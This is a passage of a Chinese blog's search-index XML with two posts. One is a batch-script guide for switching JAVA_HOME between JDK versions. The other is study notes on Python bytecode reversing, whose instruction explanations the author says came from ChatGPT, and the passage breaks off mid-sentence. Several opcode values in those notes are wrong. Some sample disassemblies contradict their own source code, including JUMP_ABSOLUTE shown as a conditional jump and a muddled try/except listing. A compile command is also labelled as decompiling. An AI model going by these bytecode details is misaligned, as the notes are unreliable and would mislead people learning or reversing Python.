            <tag> re </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置多版本JAVA，同时通过win+R快速切换</title>
      <link href="/2023/10/21/bat/%E9%80%9A%E8%BF%87cmd%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2java%E7%89%88%E6%9C%AC/"/>
      <url>/2023/10/21/bat/%E9%80%9A%E8%BF%87cmd%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2java%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>​    当我们安装多个JAVA版本时，在不同的版本间切换时需要打开系统的环境变量，修改JAVA_HOME指向的JAVA环境变量，有、麻烦。</p><p>​    因此想到了通过win+R调用bat脚本快速切换JAVA版本的方法。</p><h3 id="安装多个JAVA版本"><a href="#安装多个JAVA版本" class="headerlink" title="安装多个JAVA版本"></a>安装多个JAVA版本</h3><p>参考博客<a href="https://blog.csdn.net/weixin_44072270/article/details/117897967">【精选】在Windows环境配置多版本Java（Java8+Java16为例）_windows java版本管理-CSDN博客</a></p><h3 id="设置win-R快速启动项"><a href="#设置win-R快速启动项" class="headerlink" title="设置win+R快速启动项"></a>设置win+R快速启动项</h3><p>参考博客<a href="https://blog.csdn.net/qq_21808961/article/details/81080357">使用(运行)win+r 快速打开所有的软件_win+r查看所有应用-CSDN博客</a></p><h3 id="接下来是bat脚本的设置"><a href="#接下来是bat脚本的设置" class="headerlink" title="接下来是bat脚本的设置"></a>接下来是bat脚本的设置</h3><p>以jdk8为例</p><p>新建文本文档，在文档中输入如下内容：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">ECHO</span> OFF</span><br><span class="line"></span><br><span class="line"><span class="built_in">start</span> <span class="built_in">cmd</span> /c setx &quot;JAVA_HOME&quot; &quot;<span class="variable">%JAVA8_HOME%</span>&quot; /m   </span><br><span class="line">:: /c参数表示执行完此命令后关闭命令提示符程序<span class="built_in">cmd</span></span><br><span class="line">:: /m表示设置的变量为全局变量</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意要在<font color=Red>JAVA8_HOME</font>两侧添加百分号<font color=Red>%</font>，否则环境变量的值将设置为JAVA8_HOME的变量名而不是变量值。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021222455178.png" alt="image-20231021222455178"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021222539662.png" alt="image-20231021222539662"></p><p>将其后缀改为<font color=Red>.bat</font>,使其变为bat脚本文件</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021221412395.png" alt="image-20231021221412395"></p><p>但是修改系统环境变量需要管理员权限，经过一番百度发现可以设置快捷方式的管理员权限实现运行。</p><p>我们从Java8Change.bat创建一个名为java8的快捷方式。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021222846554.png" alt="image-20231021222846554"></p><p>设置Java8的<font color=Red>管理员权限</font>。    属性——&gt;快捷方式——&gt;高级——&gt;用管理员身份运行</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021223040126.png" alt="image-20231021223040126"></p><p>现在就设置好切换的bat脚本了，让我们测试一下</p><p>可以看到当前JAVA版本为JDK18</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021223634121.png" alt="image-20231021223634121"></p><p>运行JAVA8的bat脚本，脚本执行完后自动关闭。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021223717976.png" alt="image-20231021223717976"></p><p>重新打开命令提示符程序cmd，查看java版本，可以看到变为JDK8了</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021223855161.png" alt="image-20231021223855161"></p><p>其他版本JAVA同理，我们可以设置多个bat脚本快速切换不同版本</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231021224011581.png" alt="image-20231021224011581"></p>]]></content>
      
      
      <categories>
          
          <category> bat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python逆向</title>
      <link href="/2023/10/18/python/py%E9%80%86%E5%90%91/"/>
      <url>/2023/10/18/python/py%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>python是一门解释性的语言</p><blockquote><p>源代码—&gt;中间代码—&gt;机器语言</p></blockquote><p>编译器先将源代码编译成虚拟机指令，再由解释器对中间代码进行解释。</p><p>python有两种常见的解释器：</p><p>CPython：C语言开发，使用最广，默认的解释器</p><p>PyPy：采用JIT技术，对python代码进行动态编译，追求执行速度</p><p><a href="https://www.jianshu.com/p/bf9e2d9f4909">Python 字节码与字节码混淆 - 简书 (jianshu.com)</a>关于python字节码的知识</p><p><a href="https://www.jianshu.com/p/557cfe36f0f0">深入理解python之Opcode备忘录 - 简书 (jianshu.com)</a>这个博客里有关于字节码指令的详细解释</p><h3 id="pyc文件"><a href="#pyc文件" class="headerlink" title="pyc文件"></a>pyc文件</h3><p> pyc是编译py后生成的<font color=Red>字节码文件</font>，可以用来隐藏源代码。pyc内容跟python</p><p>版本有关。</p><p>不同版本的python可能运行不了同一个pyc文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m py_compile test.py</span><br><span class="line">#反编译pyc文件</span><br></pre></td></tr></table></figure><blockquote><p>学习python字节码学习搭配<font color=Red>chatGPT</font>，能提高学习效率</p></blockquote><p>CPython使用基于堆栈的虚拟机</p><p>在执行python文件时候，第一步: python解释器会将你写的python代码先编译为字节码<br>第二步: 当你每一次调用函数，或者刚开始运行python的时候，cpython会建立一个新的Frame，然后在这个Frame框架下，cpython会一条一条的执行编译后的ByteCode, 每一条ByteCode在C语言中有相应的代码去执行它。<br>另外，在每一个Frame里， cpython都会维护一个stack，然后ByteCode会和这个Stack进行交互操作。</p><p>python字节码官方文档<a href="https://docs.python.org/zh-cn/3/library/dis.html">dis —- Python 字节码反汇编器 — Python 3.12.0 文档</a></p><h3 id="变量指令解析"><a href="#变量指令解析" class="headerlink" title="变量指令解析"></a>变量指令解析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源码行号  |  指令偏移量  | 指令符号 | 指令参数  |  实际参数值</span><br></pre></td></tr></table></figure><p>一下解析均来自chatGPT</p><h4 id="FAST"><a href="#FAST" class="headerlink" title="FAST"></a>FAST</h4><h5 id="LOAD-FAST"><a href="#LOAD-FAST" class="headerlink" title="LOAD_FAST"></a>LOAD_FAST</h5><p><code>LOAD_FAST</code> 是 Python 字节码的一种指令，用于加载局部变量的值。具体来说，它从当前函数的局部变量数组中加载指定名称的变量的值，并将其推送到堆栈上。</p><p>以下是关于 <code>LOAD_FAST</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>LOAD_FAST</code></li><li><strong>Opcode：</strong> <code>0x7C</code></li><li><strong>参数：</strong> 一个整数索引，表示局部变量在局部变量数组中的位置</li></ul><p><code>LOAD_FAST</code> 的作用是加载函数的局部变量的值。局部变量是在函数中定义的变量，只在函数的范围内可见。</p><h4 id="GLOBAL"><a href="#GLOBAL" class="headerlink" title="GLOBAL"></a>GLOBAL</h4><h5 id="LOAD-GLOBAL"><a href="#LOAD-GLOBAL" class="headerlink" title="LOAD_GLOBAL"></a>LOAD_GLOBAL</h5><p><code>LOAD_GLOBAL</code> 是 Python 字节码的一种指令，用于加载全局变量的值。具体来说，它从当前模块的全局命名空间中加载指定名称的变量的值，并将其推送到堆栈上。</p><p>以下是关于 <code>LOAD_GLOBAL</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>LOAD_GLOBAL</code></li><li><strong>Opcode：</strong> <code>0x74</code></li><li><strong>参数：</strong> 一个整数索引，表示在常量池中的全局变量名称的位置</li></ul><p><code>LOAD_GLOBAL</code> 的作用是加载全局变量的值。全局变量是在模块级别定义的变量，可以在整个模块内被访问。</p><h5 id="STORE-NAME"><a href="#STORE-NAME" class="headerlink" title="STORE_NAME"></a>STORE_NAME</h5><p><code>STORE_NAME</code> 是 Python 字节码的一种指令，用于将值存储到局部变量的名称中。具体来说，它从堆栈中弹出一个值，然后将该值存储到当前作用域中具有指定名称的变量中。</p><p>以下是关于 <code>STORE_NAME</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>STORE_NAME</code></li><li><strong>Opcode：</strong> <code>0x5</code></li><li><strong>参数：</strong> 一个表示变量名称的字符串（变量名）</li></ul><p><code>STORE_NAME</code> 的作用是将堆栈顶部的值存储到局部变量中，变量的名称由参数指定。这通常是在赋值操作时使用的指令。</p><h4 id="LIST"><a href="#LIST" class="headerlink" title="LIST"></a>LIST</h4><h5 id="BUILD-LIST"><a href="#BUILD-LIST" class="headerlink" title="BUILD_LIST"></a>BUILD_LIST</h5><p><code>BUILD_LIST</code> 是 Python 字节码的一种指令，用于创建一个列表对象。具体来说，它从堆栈上弹出指定数量的元素，然后创建一个新的列表并将这些元素放入列表中，最后将列表对象推送回堆栈。</p><p>以下是关于 <code>BUILD_LIST</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>BUILD_LIST</code></li><li><strong>Opcode：</strong> <code>0x14</code></li><li><strong>参数：</strong> 一个整数，表示要从堆栈中弹出的元素数量</li></ul><p><code>BUILD_LIST</code> 的作用是根据堆栈上的元素创建一个新的列表对象。</p><h4 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h4><h5 id="BUILD-MAP"><a href="#BUILD-MAP" class="headerlink" title="BUILD_MAP"></a>BUILD_MAP</h5><p><code>BUILD_MAP</code> 是 Python 字节码的一种指令，用于创建一个字典对象。具体来说，它从堆栈上弹出两倍于指定元素数量的元素，然后创建一个新的字典并将这些元素添加到字典中，最后将字典对象推送回堆栈。</p><p>以下是关于 <code>BUILD_MAP</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>BUILD_MAP</code></li><li><strong>Opcode：</strong> <code>0x15</code></li><li><strong>参数：</strong> 一个整数，表示要从堆栈中弹出的键值对数量（通常是键值对的数量的两倍）</li></ul><p><code>BUILD_MAP</code> 的作用是根据堆栈上的键值对创建一个新的字典对象。</p><h4 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h4><h5 id="SETUP-LOOP"><a href="#SETUP-LOOP" class="headerlink" title="SETUP_LOOP"></a>SETUP_LOOP</h5><p><code>SETUP_LOOP</code> 是 Python 字节码的一种指令，用于在循环开始的位置设置循环的头部。它指定了循环体的开始位置.</p><p>以下是关于 <code>SETUP_LOOP</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>SETUP_LOOP</code></li><li><strong>Opcode：</strong> <code>0x13</code></li><li><strong>参数：</strong> 两个字节的有符号偏移量（表示循环体的结束位置）</li></ul><p><code>SETUP_LOOP</code> 的作用是标记循环的开始位置，并在堆栈上推送一个块堆栈（block stack）记录循环的开始位置和结束位置。当循环体结束时，<code>POP_BLOCK</code> 指令将从块堆栈中弹出该记录。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>对应的字节码可能包含：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> SETUP_LOOP              <span class="number">28</span>  <span class="comment"># 设置循环的头部，指定循环体的结束位置</span></span><br><span class="line"><span class="number">2</span> LOAD_NAME                <span class="number">0</span> (<span class="built_in">range</span>)</span><br><span class="line"><span class="number">4</span> LOAD_CONST               <span class="number">0</span> (<span class="number">5</span>)</span><br><span class="line"><span class="number">6</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line"><span class="number">8</span> GET_ITER</span><br><span class="line">&gt;&gt; <span class="number">10</span> FOR_ITER               <span class="number">16</span>  <span class="comment"># 循环体的开始</span></span><br><span class="line"><span class="number">12</span> STORE_NAME               <span class="number">1</span> (i)</span><br><span class="line"><span class="number">14</span> LOAD_NAME                <span class="number">2</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">16</span> LOAD_NAME                <span class="number">1</span> (i)</span><br><span class="line"><span class="number">18</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line"><span class="number">20</span> POP_TOP</span><br><span class="line"><span class="number">22</span> JUMP_ABSOLUTE           <span class="number">10</span>  <span class="comment"># 跳转到循环体的开始位置</span></span><br><span class="line">&gt;&gt; <span class="number">24</span> POP_BLOCK               <span class="comment"># 循环体的结束</span></span><br><span class="line"><span class="number">26</span> LOAD_CONST               <span class="number">1</span> (<span class="literal">None</span>)</span><br><span class="line"><span class="number">28</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>SETUP_LOOP</code> 用于设置循环的头部，<code>POP_BLOCK</code> 将在循环体结束时弹出块堆栈。循环体的开始和结束位置由 <code>FOR_ITER</code> 和 <code>POP_BLOCK</code> 来标记。</p><h5 id="POP-BLOCK"><a href="#POP-BLOCK" class="headerlink" title="POP_BLOCK"></a>POP_BLOCK</h5><p><code>POP_BLOCK</code> 是 Python 字节码指令之一，用于在异常处理中管理块的结束。具体来说，它用于弹出当前块的信息，以便程序继续正常执行而不是执行异常处理。在 CPython 的实现中，这通常与异常处理语句（<code>try</code>, <code>except</code>, <code>finally</code>）一起使用。</p><p>在 Python 字节码中，<code>POP_BLOCK</code> 通常出现在异常处理块的末尾，它会将与该块相关的信息从块堆栈中弹出。</p><p>例如，下面是一个简单的 Python 代码片段和对应的字节码：</p><p>Python 代码片段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pythonCopy codetry:</span><br><span class="line">    # 一些可能引发异常的代码</span><br><span class="line">    x = 1 / 0</span><br><span class="line">except ZeroDivisionError:</span><br><span class="line">    # 处理 ZeroDivisionError 异常</span><br><span class="line">    print(&quot;Division by zero!&quot;)</span><br><span class="line">finally:</span><br><span class="line">    # 无论是否发生异常，都会执行的代码块</span><br><span class="line">    print(&quot;Finally block!&quot;)</span><br><span class="line"></span><br><span class="line"># 此处的代码将继续执行</span><br><span class="line">print(&quot;After the try-except-finally block.&quot;)</span><br></pre></td></tr></table></figure><p>对应的字节码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">scssCopy code  1           0 SETUP_EXCEPT            16 (to 19)</span><br><span class="line"></span><br><span class="line">  2           3 LOAD_CONST               0 (1)</span><br><span class="line">              6 LOAD_CONST               1 (0)</span><br><span class="line">              9 BINARY_TRUE_DIVIDE</span><br><span class="line">             10 STORE_NAME               0 (x)</span><br><span class="line">             13 POP_BLOCK</span><br><span class="line">             14 POP_EXCEPT</span><br><span class="line">             15 JUMP_FORWARD             7 (to 25)</span><br><span class="line"></span><br><span class="line">  3     &gt;&gt;   18 POP_BLOCK</span><br><span class="line"></span><br><span class="line">  4     &gt;&gt;   19 SETUP_FINALLY           14 (to 36)</span><br><span class="line"></span><br><span class="line">  5          22 LOAD_NAME                1 (print)</span><br><span class="line">             25 LOAD_CONST               2 (&#x27;Division by zero!&#x27;)</span><br><span class="line">             28 CALL_FUNCTION            1</span><br><span class="line">             31 POP_BLOCK</span><br><span class="line">             32 LOAD_CONST               3 (None)</span><br><span class="line">             35 POP_EXCEPT</span><br><span class="line">             36 LOAD_NAME                1 (print)</span><br><span class="line">             39 LOAD_CONST               4 (&#x27;Finally block!&#x27;)</span><br><span class="line">             42 CALL_FUNCTION            1</span><br><span class="line">             45 END_FINALLY</span><br><span class="line"></span><br><span class="line">  6          46 LOAD_NAME                1 (print)</span><br><span class="line">             49 LOAD_CONST               5 (&#x27;After the try-except-finally block.&#x27;)</span><br><span class="line">             52 CALL_FUNCTION            1</span><br><span class="line">             55 POP_TOP</span><br><span class="line">             56 LOAD_CONST               3 (None)</span><br><span class="line">             59 RETURN_VALUE</span><br></pre></td></tr></table></figure><p>在上述字节码中，<code>POP_BLOCK</code> 出现在 <code>POP_EXCEPT</code> 和 <code>END_FINALLY</code> 之后，用于清理块堆栈。这样，程序可以继续执行正常的代码，而不是进入异常处理块。</p><h5 id="BINARY-SUBSCR"><a href="#BINARY-SUBSCR" class="headerlink" title="BINARY_SUBSCR"></a>BINARY_SUBSCR</h5><p><code>BINARY_SUBSCR</code> 是 Python 字节码的一种指令，它用于在可迭代对象（如列表、元组、字典等）上执行下标（索引）操作。具体来说，它从堆栈中弹出两个值，一个是容器对象，另一个是索引值，然后将容器对象中指定索引的元素推送回堆栈。</p><p>下面是关于 <code>BINARY_SUBSCR</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>BINARY_SUBSCR</code></li><li><strong>Opcode：</strong> <code>0x25</code></li><li><strong>参数：</strong> 无</li><li><strong>作用：</strong> 从容器对象中获取指定索引的元素，并将其推送到堆栈上。</li></ul><h5 id="STORE-SUBSCR"><a href="#STORE-SUBSCR" class="headerlink" title="STORE_SUBSCR"></a>STORE_SUBSCR</h5><p><code>STORE_SUBSCR</code> 是 Python 字节码的一种指令，用于在容器对象（如列表、字典等）中的指定索引位置存储一个值。具体来说，它从堆栈中弹出三个值：容器对象、索引值和要存储的值，然后将值存储到容器对象的指定索引位置。</p><p>以下是关于 <code>STORE_SUBSCR</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>STORE_SUBSCR</code></li><li><strong>Opcode：</strong> <code>0x3A</code></li><li><strong>参数：</strong> 无</li><li><strong>作用：</strong> 从堆栈中弹出容器对象、索引值和值，将值存储到容器对象的指定索引位置。</li></ul><p>这个指令通常在对列表、字典等进行索引赋值操作时使用。例如，如果有一个列表 <code>my_list</code>，栈顶有一个整数表示索引，而下面的两个值分别是容器对象和要存储的值，<code>STORE_SUBSCR</code> 将在列表的指定索引位置存储新的值。</p><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><h5 id="POP-JUMP-IF-FALSE"><a href="#POP-JUMP-IF-FALSE" class="headerlink" title="POP_JUMP_IF_FALSE"></a>POP_JUMP_IF_FALSE</h5><p><code>POP_JUMP_IF_FALSE</code> 是 Python 字节码的一种条件跳转指令。它用于在堆栈上弹出一个值，并在该值为假（False）时执行跳转。如果弹出的值为假，指令将跳转到指定的目标地址，否则继续执行下一条指令。</p><p>以下是关于 <code>POP_JUMP_IF_FALSE</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>POP_JUMP_IF_FALSE</code></li><li><strong>Opcode：</strong> <code>0x72</code></li><li><strong>参数：</strong> 两个字节的有符号偏移量（表示跳转目标的相对位置）</li></ul><p><code>POP_JUMP_IF_FALSE</code> 的作用是从堆栈中弹出一个值，如果该值为假（False），则执行跳转到指定的目标地址。否则，继续执行下一条指令。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> x:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is False&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is True&quot;</span>)</span><br></pre></td></tr></table></figure><p>上述代码的字节码可能包含类似下面的部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (x)</span><br><span class="line">            <span class="number">2</span> POP_JUMP_IF_FALSE       <span class="number">12</span>  <span class="comment"># 如果 x 为 False，则跳转到指令地址 12</span></span><br><span class="line">            <span class="number">4</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;x is True&#x27;</span>)</span><br><span class="line">            <span class="number">6</span> PRINT_ITEM</span><br><span class="line">            <span class="number">8</span> JUMP_FORWARD             <span class="number">8</span>  <span class="comment"># 跳转到指令地址 18，绕过 else 语句块</span></span><br><span class="line">        &gt;&gt;  <span class="number">10</span> POP_BLOCK</span><br><span class="line">       <span class="number">12</span>     LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;x is False&#x27;</span>)</span><br><span class="line">           <span class="number">14</span>     PRINT_ITEM</span><br><span class="line">           <span class="number">16</span>     JUMP_FORWARD             <span class="number">2</span>  <span class="comment"># 跳转到指令地址 18，绕过 else 语句块</span></span><br><span class="line">       &gt;&gt;  <span class="number">18</span>     LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">           <span class="number">20</span>     RETURN_VALUE</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>POP_JUMP_IF_FALSE</code> 指令用于检查变量 <code>x</code> 的真假，并根据结果选择性地执行不同的分支。</p><h5 id="JUMP-FORWARD"><a href="#JUMP-FORWARD" class="headerlink" title="JUMP_FORWARD"></a>JUMP_FORWARD</h5><p><code>JUMP_FORWARD</code> 是 Python 字节码的一种无条件跳转指令。它用于在执行过程中无条件地跳转到指定的<font color=Red>相对位置</font>。</p><p>以下是关于 <code>JUMP_FORWARD</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>JUMP_FORWARD</code></li><li><strong>Opcode：</strong> <code>0x28</code></li><li><strong>参数：</strong> 两个字节的有符号偏移量（表示跳转的相对位置）</li></ul><p><code>JUMP_FORWARD</code> 的作用是使程序跳转到当前位置之后的指定位置。它通常用于实现循环、条件语句等结构，其中需要在不同条件下跳转到不同的代码块。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> x:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is False&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;End of program&quot;</span>)</span><br></pre></td></tr></table></figure><p>上述代码的字节码可能包含类似下面的部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (x)</span><br><span class="line">            <span class="number">2</span> POP_JUMP_IF_FALSE       <span class="number">12</span>  <span class="comment"># 如果 x 为 False，则跳转到指令地址 12</span></span><br><span class="line">            <span class="number">4</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;x is True&#x27;</span>)</span><br><span class="line">            <span class="number">6</span> PRINT_ITEM</span><br><span class="line">            <span class="number">8</span> JUMP_FORWARD            <span class="number">12</span>  <span class="comment"># 无条件跳转到指令地址 20，绕过 else 语句块</span></span><br><span class="line">        &gt;&gt; <span class="number">10</span> POP_BLOCK</span><br><span class="line">       <span class="number">12</span>     LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;x is False&#x27;</span>)</span><br><span class="line">           <span class="number">14</span>     PRINT_ITEM</span><br><span class="line">           <span class="number">16</span>     JUMP_FORWARD             <span class="number">2</span>  <span class="comment"># 无条件跳转到指令地址 20，绕过 else 语句块</span></span><br><span class="line">       &gt;&gt; <span class="number">18</span>     LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">           <span class="number">20</span>     RETURN_VALUE</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>JUMP_FORWARD</code> 用于在条件判断为真时跳过 <code>else</code> 语句块。在字节码中，<code>JUMP_FORWARD</code> 的目标是跳过指定数量的字节码指令，从而实现程序的流程控制。</p><h5 id="JUMP-ABSOLUTE"><a href="#JUMP-ABSOLUTE" class="headerlink" title="JUMP_ABSOLUTE"></a>JUMP_ABSOLUTE</h5><p><code>JUMP_ABSOLUTE</code> 是 Python 字节码的一种无条件跳转指令。它用于无条件地跳转到指定的<font color=Red>绝对位置</font>。</p><p>以下是关于 <code>JUMP_ABSOLUTE</code> 指令的一些细节：</p><ul><li><strong>指令名称：</strong> <code>JUMP_ABSOLUTE</code></li><li><strong>Opcode：</strong> <code>0x71</code></li><li><strong>参数：</strong> 两个字节的有符号偏移量（表示跳转的绝对位置）</li></ul><p><code>JUMP_ABSOLUTE</code> 的作用是使程序跳转到指定的绝对位置。这个位置通常是由 <code>bytecode</code> 的相对位置计算得到的，而不是 Python 源代码中的行号。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Positive&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Non-positive&quot;</span>)</span><br></pre></td></tr></table></figure><p>对应的字节码可能包含类似下面的部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>           <span class="number">0</span> LOAD_NAME                <span class="number">0</span> (x)</span><br><span class="line">            <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">4</span> COMPARE_OP               <span class="number">4</span> (&gt;)</span><br><span class="line">            <span class="number">6</span> JUMP_ABSOLUTE           <span class="number">12</span>  <span class="comment"># 如果 x &gt; 0，则跳转到指令地址 12</span></span><br><span class="line">            <span class="number">8</span> POP_TOP</span><br><span class="line">           <span class="number">10</span> JUMP_FORWARD             <span class="number">8</span>  <span class="comment"># 跳转到指令地址 18，绕过 else 语句块</span></span><br><span class="line">        &gt;&gt; <span class="number">12</span> POP_TOP</span><br><span class="line">           <span class="number">14</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;Positive&#x27;</span>)</span><br><span class="line">           <span class="number">16</span> PRINT_ITEM</span><br><span class="line">           <span class="number">18</span> JUMP_FORWARD             <span class="number">8</span>  <span class="comment"># 跳转到指令地址 26，绕过 else 语句块</span></span><br><span class="line">        &gt;&gt; <span class="number">20</span> POP_TOP</span><br><span class="line">           <span class="number">22</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;Non-positive&#x27;</span>)</span><br><span class="line">           <span class="number">24</span> PRINT_ITEM</span><br><span class="line">        &gt;&gt; <span class="number">26</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">           <span class="number">28</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>JUMP_ABSOLUTE</code> 